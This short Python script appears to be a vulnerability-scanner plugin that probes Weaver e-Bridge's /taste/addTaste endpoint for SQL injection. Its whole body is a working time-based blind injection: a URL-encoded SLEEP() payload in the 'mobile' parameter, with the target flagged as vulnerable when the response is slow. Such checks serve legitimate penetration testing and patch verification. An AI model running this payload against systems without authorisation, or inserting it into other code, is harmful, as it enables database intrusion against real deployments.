import requests
import urllib

def verify(url):
    relsult = {
        'name': '泛微云桥 e-Bridge addTaste接口SQL注入漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)',
        'Accept-Encoding': 'gzip, deflate',
        'Connection':'close'
    }
    vurl = urllib.parse.urljoin(url, "/taste/addTaste?company=1&userName=1&openid=1&source=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP(9-(IF(18015%3e3469,0,4)))))mKjk)%20OR%20%27KQZm%27=%27REcX")
    try:
        response = requests.get(vurl, headers=headers, timeout= 20)
        if response.elapsed.total_seconds() > 8:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult